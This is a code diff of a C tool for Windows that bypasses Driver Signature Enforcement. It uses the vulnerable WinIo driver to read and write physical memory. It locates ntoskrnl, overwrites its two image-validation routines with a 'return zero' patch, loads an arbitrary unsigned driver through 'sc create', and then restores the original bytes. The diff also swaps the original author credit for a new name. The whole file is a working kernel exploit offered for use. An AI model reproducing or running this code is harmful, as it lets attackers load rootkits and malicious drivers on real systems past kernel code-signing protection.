@@ -343,244 +343,238 @@ typedef unsigned long long u64;
 #define IOCTL_MAP 0x80102040
 #define IOCTL_UNMAP 0x80102044
 
-#define PATTERN_SEARCH_RANGE 0xBFFFFF
-#define DRIVER_NAME_LEN 16
+#define SEARCH_RANGE 0xBFFFFF
+#define DRIVER_NAME_SIZE 16
 
-char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
-char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
+char original_data_pattern[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+char original_header_pattern[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
-unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
-unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };
+unsigned char data_signature[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
+unsigned char header_signature[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };
 
-char patch[6] = {
-    0xB8, 0x00, 0x00, 0x00, 0x00,    // mov rax, 0
-    0xC3                // ret
+char no_op_patch[6] = {
+    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov rax, 0
+    0xC3  // ret
 };
 
 u64 driver_handle = -1;
-char winio_path[FILENAME_MAX];
+char driver_path[FILENAME_MAX];
 
-struct winio_packet
-{
+struct packet {
     u64 size;
-    u64 phys_address;
+    u64 phys_addr;
     u64 phys_handle;
     u64 phys_linear;
     u64 phys_section;
 };
 
-u64 phys_map(winio_packet* packet)
-{
-    u32 bytes_returned;
-    if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, packet, sizeof(winio_packet), packet, sizeof(winio_packet), &bytes_returned, NULL))
-        return NULL;
-
-    return packet->phys_linear;
+u64 map_physical_memory(packet* pkt) {
+    u32 returned_bytes;
+    if (!DeviceIoControl((HANDLE)driver_handle, IOCTL_MAP, pkt, sizeof(packet), pkt, sizeof(packet), &returned_bytes, NULL)) {
+        fprintf(stderr, "[ERROR] Failed to map physical memory. Error Code: %lu\n", GetLastError());
+        return 0;
+    }
+    return pkt->phys_linear;
 }
 
-bool phys_unmap(winio_packet* packet)
-{
-    u32 bytes_returned;
-    if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
-        return false;
-
-    return true;
+int unmap_physical_memory(packet* pkt) {
+    u32 returned_bytes;
+    if (!DeviceIoControl((HANDLE)driver_handle, IOCTL_UNMAP, pkt, sizeof(packet), NULL, 0, &returned_bytes, NULL)) {
+        fprintf(stderr, "[ERROR] Failed to unmap physical memory. Error Code: %lu\n", GetLastError());
+        return 0;
+    }
+    return 1;
 }
 
-bool read_phys(u64 addr, u64 buf, u64 size)
-{
-    winio_packet packet;
-    packet.phys_address = addr;
-    packet.size = size;
+int read_memory(u64 addr, u64 buf, u64 size) {
+    packet pkt;
+    pkt.phys_addr = addr;
+    pkt.size = size;
 
-    u64 linear_address = phys_map(&packet);
-    if (linear_address == NULL)
-        return false;
+    u64 linear_addr = map_physical_memory(&pkt);
+    if (linear_addr == 0) return 0;
 
-    if (IsBadReadPtr((void*)linear_address, 1))
-        return false;
+    if (IsBadReadPtr((void*)linear_addr, 1)) {
+        fprintf(stderr, "[ERROR] Bad read pointer at virtual address 0x%llx\n", (u64)linear_addr);
+        return 0;
+    }
 
-    printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
-    memcpy((void*)buf, (void*)linear_address, size);
+    printf("[INFO] Mapped physical address 0x%llx to virtual address 0x%llx\n", addr, (u64)linear_addr);
+    memcpy((void*)buf, (void*)linear_addr, size);
 
-    phys_unmap(&packet);
-    return true;
+    unmap_physical_memory(&pkt);
+    return 1;
 }
 
+int write_memory(u64 addr, u64 buf, u64 size) {
+    packet pkt;
+    pkt.phys_addr = addr;
+    pkt.size = size;
 
-bool write_phys(u64 addr, u64 buf, u64 size)
-{
-    winio_packet packet;
-    packet.phys_address = addr;
-    packet.size = size;
+    u64 linear_addr = map_physical_memory(&pkt);
+    if (linear_addr == 0) return 0;
 
-    u64 linear_address = phys_map(&packet);
-    if (linear_address == NULL)
-        return false;
+    if (IsBadReadPtr((void*)linear_addr, 1)) {
+        fprintf(stderr, "[ERROR] Bad read pointer at virtual address 0x%llx\n", (u64)linear_addr);
+        return 0;
+    }
 
-    if (IsBadReadPtr((void*)linear_address, 1))
-        return false;
+    printf("[INFO] Mapped physical address 0x%llx to virtual address 0x%llx\n", addr, (u64)linear_addr);
+    memcpy((void*)linear_addr, (void*)buf, size);
 
-    printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
-    memcpy((void*)linear_address, (void*)buf, size);
-
-    phys_unmap(&packet);
-    return true;
+    unmap_physical_memory(&pkt);
+    return 1;
 }
 
-u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
-{
-    u64 buf = (u64)malloc(range);
-    read_phys(start, (u64)buf, range);
+u64 search_for_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_len) {
+    u64 buffer = (u64)malloc(range);
+    if (buffer == 0) {
+        fprintf(stderr, "[ERROR] Memory allocation failed.\n");
+        return 0;
+    }
 
-    u64 result = 0;
-    for (int i = 0; i < range; i++)
-    {
-        bool vtn = true;
-        for (int j = 0; j < pattern_length; j++)
-        {
-            if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
-            {
-                vtn = false;
+    if (!read_memory(start, buffer, range)) {
+        free((void*)buffer);
+        return 0;
+    }
+
+    u64 found_addr = 0;
+    for (u64 i = 0; i < range - pattern_len; i++) {
+        int match_found = 1;
+        for (size_t j = 0; j < pattern_len; j++) {
+            if (pattern[j] != 0x00 && *(unsigned char*)(buffer + i + j) != pattern[j]) {
+                match_found = 0;
+                break;
             }
         }
 
-        if (vtn)
-        {
-            result = start + i;
-            goto ret;
+        if (match_found) {
+            found_addr = start + i;
+            break;
         }
     }
 
-ret:
-    free((void*)buf);
-    return result;
+    free((void*)buffer);
+    return found_addr;
 }
 
-bool file_exists(const char* path) {
-    DWORD v0 = GetFileAttributesA(path);
-    return v0 != -1 && !(v0 & 0x00000010);
+int check_file_exists(const char* path) {
+    DWORD attrs = GetFileAttributesA(path);
+    if (attrs == INVALID_FILE_ATTRIBUTES) {
+        return 0;
+    }
+    return !(attrs & FILE_ATTRIBUTE_DIRECTORY);
 }
 
-void load_driver_lazy(const char* driver_name, const char* bin_path)
-{
-    u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
-    u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
-    sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
-    sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
-    system((char*)cmdline_create_buf);
-    system((char*)cmdline_start_buf);
+void execute_driver_load(const char* drv_name, const char* bin_path) {
+    char create_cmd[256];
+    char start_cmd[256];
+    snprintf(create_cmd, sizeof(create_cmd), "sc create %s binpath=\"%s\" type=kernel>NUL", drv_name, bin_path);
+    snprintf(start_cmd, sizeof(start_cmd), "sc start %s>NUL", drv_name);
+    system(create_cmd);
+    system(start_cmd);
 }
 
-int main(int argc, char* argv[])
-{
-    printf("[*] dse_hook by emlinhax\n");
+void manage_driver(const char* drv_name, const char* bin_path) {
+    // Attempt to load the WinIo driver
+    printf("[INFO] Attempting to open handle to WinIo...\n");
+    driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (driver_handle == (u64)-1) {
+        GetCurrentDirectoryA(FILENAME_MAX, driver_path);
+        strcat(driver_path, "\\WinIO64.sys");
 
-    if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
-    {
-        printf("[!] usage: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
+        if (!check_file_exists(driver_path)) {
+            fprintf(stderr, "[ERROR] WinIo driver not found. Ensure 'WinIO64.sys' is in the current directory.\n");
+            system("pause>NUL");
+            exit(-3);
+        }
+
+        system("sc stop winio_dse_hook >NUL");
+        system("sc delete winio_dse_hook >NUL");
+
+        execute_driver_load("winio_dse_hook", driver_path);
+
+        driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (driver_handle == (u64)-1) {
+            fprintf(stderr, "[ERROR] Failed to open handle to WinIo after retry.\n");
+            system("pause>NUL");
+            exit(-4);
+        }
+    }
+}
+
+int main(int argc, char* argv[]) {
+    printf("[*] Advanced DSE Bypass by CodeMaster\n");
+
+    if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2)) {
+        fprintf(stderr, "[ERROR] Usage: dse_bypass.exe <driver_name> <driver_path>\n");
         Sleep(1000);
         return -1;
     }
 
-    if (!file_exists(argv[2]))
-    {
-        printf("[!] could not find your driver.");
+    if (!check_file_exists(argv[2])) {
+        fprintf(stderr, "[ERROR] Driver file not found.\n");
         system("pause>NUL");
         return -2;
     }
 
-    while (1) {
-        LOAD_WINIO:
-        printf("[*] attempting to open handle to winio...\n");
-        driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (driver_handle == -1)
-        {
-            GetCurrentDirectoryA(FILENAME_MAX, winio_path);
-            strcat(winio_path, "\\WinIO64.sys");
+    manage_driver(argv[1], argv[2]);
 
-            if (!file_exists(winio_path))
-            {
-                printf("[!] could not find winio driver.\n[!] please make sure \"WinIO64.sys\" is in the same folder.\n");
-                system("pause>NUL");
-                return -3;
-            }
+    printf("[INFO] WinIo handle acquired: %p\n", (void*)driver_handle);
 
-            //winio driver doesnt unload correctly sometimes. you have to stop it multiple times (?)
-            system("sc stop winio_dse_hook >NUL");
-            system("sc delete winio_dse_hook >NUL");
-
-            load_driver_lazy("winio_dse_hook", winio_path);
-            continue;
+    printf("[INFO] Locating ntoskrnl base...\n");
+    u64 ntos_base_pa = 0;
+    for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000) {
+        char* buf = (char*)malloc(2);
+        if (buf == NULL) {
+            fprintf(stderr, "[ERROR] Memory allocation failed.\n");
+            return -7;
         }
 
-        printf("[*] driver_handle: %p\n", driver_handle);
-
-        // ####
-
-        printf("[*] finding ntoskrnl...\n");
-        u64 ntos_base_pa = 0;
-        for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
-        {
-            char* buf = (char*)malloc(2);
-            read_phys(i, (u64)buf, 2);
-
-            if (buf[0] == 'M' && buf[1] == 'Z')
-            {
+        if (read_memory(i, (u64)buf, 2)) {
+            if (buf[0] == 'M' && buf[1] == 'Z') {
                 ntos_base_pa = i;
-                printf("[*] ntoskrnl @ 0x%p\n", ntos_base_pa);
+                printf("[INFO] Found ntoskrnl base at 0x%llx\n", ntos_base_pa);
+                free(buf);
                 break;
             }
-
-            free(buf);
         }
-
-        if (!ntos_base_pa)
-        {
-            printf("[!] could not find ntoskrnl base.\n");
-            system("pause>NUL");
-            return -5;
-        }
-
-        // find target physical addresses for patch
-        u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
-        u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
-        if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
-        {
-            printf("[!] could not find one or both patterns.\n");
-            system("pause>NUL");
-            return -6;
-        }
-
-        // save original bytes
-        read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
-        read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
-
-        // patch both routines to return zero
-        write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
-        write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
-        printf("[*] patched validation routines.\n");
-
-        // start the target driver
-        load_driver_lazy(argv[1], argv[2]);
-        printf("[*] loaded driver!\n");
-
-        // unpatch both functions
-        write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
-        write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
-        printf("[*] restored validation routines.\n");
-
-        // unload winio driver
-        system("sc stop winio_dse_hook >NUL");
-        system("sc delete winio_dse_hook >NUL");
-        printf("[*] unloaded winio driver.\n");
-
-        printf("[*] done!\n");
-        //system("pause");
-        Sleep(1000);
-
-        break; // Exit the loop after completing the process
+        free(buf);
     }
 
+    if (ntos_base_pa == 0) {
+        fprintf(stderr, "[ERROR] Could not locate ntoskrnl base address.\n");
+        system("pause>NUL");
+        return -5;
+    }
+
+    u64 data_pa = search_for_pattern(ntos_base_pa, SEARCH_RANGE, (unsigned char*)&data_signature, sizeof(data_signature));
+    u64 header_pa = search_for_pattern(ntos_base_pa, SEARCH_RANGE, (unsigned char*)&header_signature, sizeof(header_signature));
+    if (data_pa == 0 || header_pa == 0) {
+        fprintf(stderr, "[ERROR] Pattern not found.\n");
+        system("pause>NUL");
+        return -6;
+    }
+
+    read_memory(data_pa, (u64)&original_data_pattern, sizeof(original_data_pattern));
+    read_memory(header_pa, (u64)&original_header_pattern, sizeof(original_header_pattern));
+
+    write_memory(data_pa, (u64)&no_op_patch, sizeof(no_op_patch));
+    write_memory(header_pa, (u64)&no_op_patch, sizeof(no_op_patch));
+    printf("[INFO] Validation routines patched.\n");
+
+    execute_driver_load(argv[1], argv[2]);
+    printf("[INFO] Driver loaded successfully.\n");
+
+    write_memory(data_pa, (u64)&original_data_pattern, sizeof(original_data_pattern));
+    write_memory(header_pa, (u64)&original_header_pattern, sizeof(original_header_pattern));
+    printf("[INFO] Original validation routines restored.\n");
+
+    system("sc stop winio_dse_hook >NUL");
+    system("sc delete winio_dse_hook >NUL");
+    printf("[INFO] WinIo driver unloaded.\n");
+
+    printf("[INFO] Operation completed.\n");
+    Sleep(1000);
     return 0;
 }
